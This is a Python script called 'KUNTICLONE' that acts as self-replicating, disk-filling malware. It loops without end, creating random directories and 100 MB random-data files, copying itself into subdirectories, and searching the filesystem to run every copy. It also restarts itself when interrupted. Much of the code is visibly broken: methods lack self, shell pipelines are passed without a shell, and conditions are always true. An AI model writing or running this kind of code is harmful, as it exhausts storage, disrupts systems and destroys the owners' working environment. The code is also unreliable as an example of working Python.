from sys import argv
import subprocess
import string
import sys
import random
import os
from termcolor import colored as cl

class zetsu:
    def __init__(self, nn, ii, ff, pj, yh):
        self.nn = nn
        self.ii = ii
        self.ff = ff
        self.pj = pj
        self.yh = yh

    def logo():
        print(cl("""
  (( ))
  66666 __________  6
  6 6 6 KUNTICLONE\\/
  66666  ||    ||
   666   **    **
  By CukiD for UNIX\n""", "red"))

    def genuk(aa, bb):
        kb = 100_000
        with open(bb, 'wb') as file:
            file.write(os.urandom(aa*kb))

    def main(self):
        while(self.ii > 0):
            rn = ''.join(random.choice(string.ascii_letters) for _ in range(self.pj))
            try:
                if self.ii == self.ii:
                    self.ii += 1
                    dir = rn+str(self.ii)
                    subprocess.call(['mkdir', dir])
                    self.genuk(1024, self.ff)
                    subprocess.call(['cp',self.ff,dir])
                    subprocess.call([f'cp {self.yh} $pwd/{dir}'])
                    subprocess.call([f'cp {self.nn} $pwd/{dir}'])
                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
                elif self.ii <= self.ii:
                    self.ii += 2
                    dir = rn+str(self.ii)
                    subprocess.call(['mkdir', dir])
                    self.genuk(1024, self.ff)
                    subprocess.call(['cp',self.ff,dir])
                    subprocess.call([f'cp {self.yh}',dir])
                    subprocess.call(['cp',self.nn,dir])
                    subprocess.call([f'ls -h | grep / | xargs -I % cp {dir} %/{dir}'])
                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
                    subprocess.call(['find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',dir,'@'])
                    subprocess.call([f'find / | grep {self.yh} | uniq | xargs -I @ python3 @'])
            except KeyboardInterrupt:
                zetsu.main(self.nn, self.ii, self.ff, self.pj, self.yh)

if __name__ == "__main__":
    perintah = argv
    nama = str(perintah[0])
    i = 1
    filename = "karma"
    panjang = 16
    yuhu = sys.argv[0]
    namaprogram = yuhu[2:]
    zetsu.logo()
    zetsu.main(nama, i, filename, panjang, namaprogram)